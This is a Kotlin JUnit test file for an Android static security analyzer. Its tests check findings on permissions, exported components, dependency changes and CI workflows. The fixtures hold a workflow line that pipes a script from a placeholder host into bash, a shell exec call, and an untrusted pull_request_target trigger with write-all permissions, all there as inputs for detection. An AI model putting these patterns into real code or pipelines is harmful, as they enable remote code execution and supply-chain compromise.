package app.nestro.coworkbench

import java.nio.file.Files
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class CoworkbenchStaticAnalyzerTest {
    @Test
    fun scansManifestPermissionsDependenciesAndSensitiveApis() {
        val root = Files.createTempDirectory("nestro-coworkbench-analysis").toFile()
        try {
            root.resolve("app/src/main/AndroidManifest.xml").apply {
                parentFile.mkdirs()
                writeText(
                    """<manifest>
                        <uses-permission android:name="android.permission.CAMERA" />
                        <application android:allowBackup="true">
                            <activity android:exported="true" />
                        </application>
                    </manifest>""".trimIndent()
                )
            }
            root.resolve("app/build.gradle.kts").writeText(
                """dependencies {
                    implementation("org.example:demo:1.+")
                }"""
            )
            root.resolve("app/src/main/Example.kt").apply {
                parentFile.mkdirs()
                writeText("Runtime.getRuntime().exec(\"sh\")")
            }

            val report = CoworkbenchStaticAnalyzer.analyze(root)
            assertTrue(report.scannedFiles >= 3)
            assertTrue(report.dependencyDeclarations.any { it.contains("org.example:demo:1.+") })
            assertTrue(report.findings.any { it.category == "Manifest 权限" })
            assertTrue(report.findings.any { it.category == "导出组件" })
            assertTrue(report.findings.any { it.category == "命令执行" && it.level == CoworkbenchFindingLevel.HIGH })
            assertTrue(report.findings.any { it.category == "依赖版本" })
        } finally {
            root.deleteRecursively()
        }
    }

    @Test
    fun skipsBuildAndGitDirectoriesAndReportsBoundedScan() {
        val root = Files.createTempDirectory("nestro-coworkbench-bounds").toFile()
        try {
            root.resolve(".git/config").apply { parentFile.mkdirs(); writeText("http://ignored.example") }
            root.resolve("build/generated/Generated.kt").apply { parentFile.mkdirs(); writeText("http://ignored.example") }
            root.resolve("src/main/Allowed.kt").apply { parentFile.mkdirs(); writeText("https://example.com") }

            val report = CoworkbenchStaticAnalyzer.analyze(root)
            assertEquals(1, report.scannedFiles)
            assertFalse(report.findings.any { it.evidence.contains("ignored.example") })
            assertFalse(report.truncated)
        } finally {
            root.deleteRecursively()
        }
    }
    @Test
    fun comparesProposedManifestPermissionsAndExportedComponents() {
        val root = Files.createTempDirectory("nestro-coworkbench-manifest-diff").toFile()
        try {
            root.resolve("app/src/main/AndroidManifest.xml").apply {
                parentFile.mkdirs()
                writeText("""<manifest>
                    <uses-permission android:name="android.permission.CAMERA" />
                    <application>
                        <activity android:name=".HomeActivity" android:exported="false" />
                    </application>
                </manifest>""".trimIndent())
            }
            val after = """<manifest>
                <uses-permission android:name="android.permission.CAMERA" />
                <uses-permission android:name="android.permission.SEND_SMS" />
                <application android:debuggable="true">
                    <service android:name=".RemoteService" android:exported="true" />
                </application>
            </manifest>""".trimIndent()
            val impact = CoworkbenchStaticAnalyzer.analyzeProposalsWithBaseline(
                root,
                listOf(CoworkbenchProposal("app/src/main/AndroidManifest.xml", after))
            )
            assertEquals(listOf("android.permission.SEND_SMS"), impact.permissionsAdded)
            assertTrue(impact.findings.any { it.category == "新增导出组件" && it.level == CoworkbenchFindingLevel.HIGH })
            assertTrue(impact.findings.any { it.category == "启用调试模式" })
        } finally {
            root.deleteRecursively()
        }
    }

    @Test
    fun comparesAddedAndRemovedGradleDependencies() {
        val root = Files.createTempDirectory("nestro-coworkbench-dependency-diff").toFile()
        try {
            root.resolve("app/build.gradle.kts").apply {
                parentFile.mkdirs()
                writeText("""dependencies {
                    implementation("org.example:old:1.0")
                }""".trimIndent())
            }
            val after = """dependencies {
                implementation("org.example:new:2.+")
            }""".trimIndent()
            val impact = CoworkbenchStaticAnalyzer.analyzeProposalsWithBaseline(
                root,
                listOf(CoworkbenchProposal("app/build.gradle.kts", after))
            )
            assertTrue(impact.dependenciesAdded.any { it.contains("org.example:new:2.+") })
            assertTrue(impact.dependenciesRemoved.any { it.contains("org.example:old:1.0") })
            assertTrue(impact.findings.any { it.category == "新增构建依赖" && it.level == CoworkbenchFindingLevel.HIGH })
        } finally {
            root.deleteRecursively()
        }
    }

    @Test
    fun flagsUntrustedWorkflowTriggersAndMutableActions() {
        val root = Files.createTempDirectory("nestro-coworkbench-workflow").toFile()
        try {
            root.resolve(".github/workflows/checks.yml").apply {
                parentFile.mkdirs()
                writeText("""name: checks
on: pull_request_target
permissions: write-all
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
      - run: curl https://example.invalid/install.sh | bash
""".trimIndent())
            }
            val report = CoworkbenchStaticAnalyzer.analyze(root)
            assertTrue(report.findings.any { it.category == "CI 触发边界" && it.level == CoworkbenchFindingLevel.HIGH })
            assertTrue(report.findings.any { it.category == "CI Action 未固定摘要" })
            assertTrue(report.findings.any { it.category == "CI 权限" && it.level == CoworkbenchFindingLevel.HIGH })
            assertTrue(report.findings.any { it.category == "远程脚本执行" && it.level == CoworkbenchFindingLevel.HIGH })
        } finally {
            root.deleteRecursively()
        }
    }

    @Test
    fun comparesGradleVersionCatalogAliasesAndVersionRefs() {
        val root = Files.createTempDirectory("nestro-coworkbench-catalog-diff").toFile()
        try {
            root.resolve("gradle/libs.versions.toml").apply {
                parentFile.mkdirs()
                writeText("""[versions]
core = "1.0"

[libraries]
core-lib = { group = "org.example", name = "core", version.ref = "core" }
""".trimIndent())
            }
            val after = """[versions]
core = "2.0"

[libraries]
core-lib = { group = "org.example", name = "core", version.ref = "core" }
""".trimIndent()
            val impact = CoworkbenchStaticAnalyzer.analyzeProposalsWithBaseline(
                root,
                listOf(CoworkbenchProposal("gradle/libs.versions.toml", after))
            )
            assertTrue(impact.dependenciesAdded.any { it.contains("catalog-value:core:2.0") })
            assertTrue(impact.dependenciesRemoved.any { it.contains("catalog-value:core:1.0") })
            assertTrue(impact.dependenciesAdded.any { it.contains("catalog:core-lib:org.example:core:core") })
        } finally {
            root.deleteRecursively()
        }
    }

}
